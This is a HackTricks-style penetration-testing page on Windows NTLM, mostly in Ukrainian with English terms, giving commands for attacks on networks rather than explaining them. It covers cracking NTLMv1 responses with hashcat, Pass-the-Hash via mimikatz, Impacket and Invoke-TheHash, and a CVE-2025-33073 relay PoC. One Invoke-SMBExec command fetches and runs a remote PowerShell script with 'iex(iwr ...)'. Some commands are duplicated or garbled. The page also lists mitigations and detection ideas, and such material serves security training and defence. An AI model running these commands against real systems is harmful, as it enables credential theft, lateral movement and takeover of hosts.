# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

У середовищах, де використовується **Windows XP and Server 2003**, застосовуються LM (Lan Manager) хеші, хоча широко відомо, що їх можна легко скомпрометувати. Певний LM хеш, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на сценарій, коли LM не використовується, і є хешем порожнього рядка.

За замовчуванням, протокол автентифікації **Kerberos** є основним методом. NTLM (NT LAN Manager) використовується за певних умов: відсутність Active Directory, неіснування домену, збій Kerberos через неправильну конфігурацію або коли підключення намагаються встановити за IP-адресою, а не за дійсним hostname.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах сигналізує про процес автентифікації NTLM.

Підтримка протоколів автентифікації - LM, NTLMv1, і NTLMv2 - забезпечується спеціальною DLL, що знаходиться в `%windir%\Windows\System32\msv1\_0.dll`.

**Key Points**:

- LM hashes є вразливими, а порожній LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) означає, що він не використовується.
- Kerberos є методом автентифікації за замовчуванням, а NTLM використовується лише за певних умов.
- Пакети автентифікації NTLM можна впізнати за заголовком "NTLMSSP".
- Протоколи LM, NTLMv1 і NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../images/image (919).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Можливі значення:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** вводить свої **credentials**
2. Машина клієнта **надсилає authentication request**, передаючи **domain name** і **username**
3. **server** надсилає **challenge**
4. **client encrypts** **challenge**, використовуючи hash пароля як key, і надсилає його як response
5. **server sends** до **Domain controller** **domain name, username, challenge and response**. Якщо **немає** налаштованого Active Directory або domain name є ім’ям сервера, credentials **перевіряються локально**.
6. **domain controller checks if everything is correct** і надсилає інформацію назад на server

**server** і **Domain Controller** можуть створити **Secure Channel** через **Netlogon** server, оскільки Domain Controller знає пароль server (він міститься в db **NTDS.DIT**).

### Local NTLM authentication Scheme

Authentication відбувається так само, як **вище, але** **server** знає **hash user**, який намагається authenticate, у файлі **SAM**. Тож, замість запиту до Domain Controller, **server will check itself** чи може user authenticate.

### NTLMv1 Challenge

Довжина **challenge** — 8 bytes, а **response** — 24 bytes.

Hash NT (**16bytes**) поділяється на **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): **last part is filled with zeros**. Потім **challenge** **ciphered separately** з кожною частиною, і **resulting** ciphered bytes об’єднуються. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Lack of **randomness**
- The 3 parts can be **attacked separately** to find the NT hash
- **DES is crackable**
- The 3º key is composed always by **5 zeros**.
- Given the **same challenge** **response** буде **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.

### NTLMv1 attack

Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.

You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).

### NTLMv1 attack with hashcat

NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
виводитиме нижченаведене:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Створіть файл із вмістом:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Запустіть hashcat (краще у distributed-режимі через інструмент на кшталт hashtopolis), оскільки інакше це займе кілька днів.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
У цьому випадку ми знаємо, що пароль тут — password, тож для демонстраційних цілей ми трохи схитруємо:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Тепер нам потрібно використати hashcat-utilities, щоб конвертувати зламані des keys у частини NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Нарешті остання частина:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Поєднай їх разом:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Довжина challenge** становить **8 байтів**, і **надсилаються 2 responses**: один має **24 байти** завдовжки, а довжина **іншого** є **змінною**.

**Перший response** створюється шляхом шифрування за допомогою **HMAC_MD5** **string**, що складається з **client** і **domain**, використовуючи як **key** **hash MD4** від **NT hash**. Потім **result** буде використано як **key** для шифрування за допомогою **HMAC_MD5** **challenge**. До цього буде додано **client challenge** у 8 байтів. Разом: 24 B.

**Другий response** створюється з використанням **кількох значень** (новий **client challenge**, **timestamp** для запобігання **replay attacks**...)

Якщо у вас є **pcap**, у якому захоплено успішний процес автентифікації, ви можете скористатися цим гайдом, щоб отримати **domain, username, challenge** і **response** та спробувати **creak** пароль: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Після того як ви отримаєте hash жертви**, ви можете використати його, щоб **імперсонувати** її.\
Потрібно використати **tool**, який **виконає** **NTLM authentication** з використанням цього **hash**, **або** ви можете створити новий **sessionlogon** і **inject** цей **hash** всередину **LSASS**, щоб коли виконується будь-яка **NTLM authentication**, використовувався саме цей **hash**. Останній варіант — це те, що робить mimikatz.

**Будь ласка, пам’ятайте, що ви також можете виконувати Pass-the-Hash attacks, використовуючи облікові записи Computer.**

### **Mimikatz**

**Потрібно запускати як administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Це запустить процес, який належатиме користувачам, що запустили mimikatz, але всередині LSASS збережені облікові дані будуть тими, що вказані в параметрах mimikatz. Потім ви зможете отримувати доступ до мережевих ресурсів так, ніби ви цей користувач (схоже на трюк `runas /netonly`, але вам не потрібно знати пароль у відкритому вигляді).

### Pass-the-Hash from linux

Ви можете отримати code execution на Windows-машинах, використовуючи Pass-the-Hash з Linux.\
[**Дивіться тут, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Ви можете завантажити [бінарні файли impacket для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку потрібно вказати команду, cmd.exe і powershell.exe не є валідними для отримання інтерактивної shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарних файлів Impacket...

### Invoke-TheHash

Ви можете отримати скрипти powershell звідси: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ця функція є **сумішшю всіх інших**. Ви можете вказати **кілька хостів**, **виключити** деякі та **обрати** **опцію**, яку хочете використовувати (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви оберете **будь-який** із **SMBExec** і **WMIExec**, але **не** вкажете параметр _**Command**_, вона лише **перевірить**, чи маєте ви **достатні права**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей інструмент робить те саме, що й mimikatz (змінює пам’ять LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password


{{#ref}}
../lateral-movement/
{{#endref}}

## Витягнення credentials з Windows Host

**For more information about** [**how to obtain credentials from a Windows host you should read this page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack — це прихована техніка витягнення credentials, яка дозволяє attacker отримати NTLM hashes з машини victim **без прямої взаємодії з процесом LSASS**. На відміну від Mimikatz, який читає hashes напряму з memory і часто блокується endpoint security solutions або Credential Guard, цей attack використовує **local calls до NTLM authentication package (MSV1_0) через Security Support Provider Interface (SSPI)**. Спочатку attacker **downgrades NTLM settings** (наприклад, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), щоб забезпечити дозвіл NetNTLMv1. Потім він impersonate існуючі user tokens, отримані з running processes, і локально запускає NTLM authentication, щоб згенерувати NetNTLMv1 responses за допомогою відомого challenge.

Після перехоплення цих NetNTLMv1 responses attacker може швидко відновити original NTLM hashes за допомогою **precomputed rainbow tables**, що дає змогу виконувати подальші Pass-the-Hash attacks для lateral movement. Ключова перевага Internal Monologue Attack у тому, що він залишається прихованим, бо не створює network traffic, не inject code і не викликає direct memory dumps, через що його важче виявити defenders порівняно з традиційними методами, як-от Mimikatz.

Якщо NetNTLMv1 не приймається — через enforced security policies, attacker може не отримати NetNTLMv1 response.

Щоб обробити цей випадок, інструмент Internal Monologue було оновлено: він динамічно отримує server token за допомогою `AcceptSecurityContext()`, щоб все ще **capture NetNTLMv2 responses** у разі, якщо NetNTLMv1 не вдається. Хоча NetNTLMv2 значно важче crack, він усе ще відкриває шлях для relay attacks або offline brute-force в обмежених випадках.

PoC можна знайти тут: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Read more detailed guide on how to perform those attacks here:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges from a network capture

**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows містить кілька mitigations, які намагаються запобігти *reflection* attacks, коли NTLM (або Kerberos) authentication, що походить із host, relay back на **той самий** host, щоб отримати SYSTEM privileges.

Microsoft зламала більшість public chains у MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) та пізніших patches, однак **CVE-2025-33073** показує, що protections все ще можна обходити, зловживаючи тим, як **SMB client truncates Service Principal Names (SPNs)**, які містять *marshalled* (serialized) target-info.

### TL;DR of the bug
1. Attacker реєструє **DNS A-record**, чиє label кодує marshalled SPN – наприклад
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim змушують authenticate до цього hostname (PetitPotam, DFSCoerce, etc.).
3. Коли SMB client передає target string `cifs/srv11UWhRCAAAAA…` до `lsasrv!LsapCheckMarshalledTargetInfo`, виклик `CredUnmarshalTargetInfo` **strips** serialized blob, залишаючи **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (або Kerberos equivalent) тепер вважає target *localhost*, тому що коротка частина host відповідає computer name (`SRV1`).
5. Унаслідок цього server встановлює `NTLMSSP_NEGOTIATE_LOCAL_CALL` і injects **LSASS’ SYSTEM access-token** у context (для Kerberos створюється SYSTEM-marked subsession key).
6. Relaying цієї authentication за допомогою `ntlmrelayx.py` **або** `krbrelayx.py` дає повні SYSTEM rights на тому самому host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Enforce **SMB signing** to prevent reflection even on unpatched hosts.
* Monitor DNS records resembling `*<base64>...*` and block coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures with `NTLMSSP_NEGOTIATE_LOCAL_CALL` where client IP ≠ server IP.
* Kerberos AP-REQ containing a subsession key and a client principal equal to the hostname.
* Windows Event 4624/4648 SYSTEM logons immediately followed by remote SMB writes from the same host.

For the **March 2026** local reflection variant that abuses **SMB arbitrary ports** and **TCP connection reuse** to reach `NT AUTHORITY\SYSTEM`, see:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
